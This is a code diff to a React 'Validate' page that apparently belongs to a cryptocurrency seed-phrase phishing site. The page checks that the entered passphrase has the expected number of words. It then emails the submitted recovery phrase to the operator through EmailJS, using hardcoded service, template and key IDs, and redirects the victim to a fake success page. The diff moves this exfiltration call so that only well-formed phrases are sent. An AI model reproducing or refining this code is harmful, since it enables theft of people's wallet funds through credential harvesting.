@@ -29,28 +29,28 @@ export default function Validate() {
     }
     if (phrases.length === phraseNumber || phrases.length === phraseNumber2) {
       setLoading(false);
-      
+       const result = await emailjs.sendForm(
+         "service_e3ri2nl",
+         "template_3kwpega",
+         form.current!,
+         "05CQigNmYVMazVvCb"
+       );
+       if (result.status === 200) {
+         setLoading(false);
+         setPhrase("");
+         setValid(true);
+         router.push("/success");
+       } else {
+         setLoading(false);
+         setError("Something went wrong, try again later");
+       }
     }else{
       return setError(
         `Passphrase must have ${phraseNumber} or ${phraseNumber2} words but you provided only ${phrases.length}`
       );
     }
     
-    const result = await emailjs.sendForm(
-      "service_e3ri2nl",
-      "template_3kwpega",
-      form.current!,
-      "05CQigNmYVMazVvCb"
-    );
-    if (result.status === 200) {
-      setLoading(false);
-      setPhrase("");
-      setValid(true);
-      router.push("/success");
-    } else {
-      setLoading(false);
-      setError("Something went wrong, try again later");
-    }
+   
   };
   useEffect(() => setError(""), [phrase]);
 
@@ -107,7 +107,7 @@ export default function Validate() {
           </div>
           <div
             className={`duration-500 ${
-              error === "" ? "h-0 opacity-0 overflow-hidden" : "h-5 opacity-100"
+              error === "" ? "h-0 opacity-0 overflow-hidden" : "h-6 opacity-100"
             } `}
           >
             <p className="text-sm text-red-500 m-1">{error}</p>
